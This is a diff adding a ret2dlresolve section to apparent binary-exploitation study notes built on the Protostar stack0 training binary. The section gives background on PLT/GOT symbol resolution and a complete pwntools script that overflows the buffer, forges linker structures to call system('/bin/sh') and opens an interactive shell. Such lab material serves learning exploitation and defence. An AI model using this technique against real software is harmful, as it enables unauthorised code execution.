@@ -81,3 +81,34 @@ p.interactive()
 ```
 
 ![shell3](shell3.png)
+
+### ret2dlresolve
+
+#### Background knowledge
+
+Dynamically-linked ELF objects import `libc` functions when they are first called using the PLT and GOT. During the relocation of a runtime symbol, RIP will jump to the PLT and attempt to resolve the symbol. During this process a "resolver" is called.
+
+The PLT jumps to wherever the GOT points. Originally, before the GOT is updated, it points back to the instruction after the jmp in the PLT to resolve it. In order to resolve the functions, there are 3 structures that need to exist within the binary. Faking these 3 structures could enable us to trick the linker into resolving a function of our choice, and we can also pass parameters in (such as /bin/sh) once resolved.
+
+```python
+#!python3
+from pwn import *
+
+elf = context.binary = ELF('../protostar/stack0', checksec=False)
+p = elf.process()
+rop = ROP(elf)
+
+# create the dlresolve object
+dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
+
+rop.raw('A' * 80)
+rop.gets(dlresolve.data_addr) # gets to where we want to write the fake structures
+rop.ret2dlresolve(dlresolve)     # call .plt and dl-resolve() with the correct, calculated reloc_offset
+
+log.info(rop.dump())
+
+p.sendline(rop.chain())
+p.sendline(dlresolve.payload)    # now the read is called and we pass all the relevant structures in
+
+p.interactive()
+```
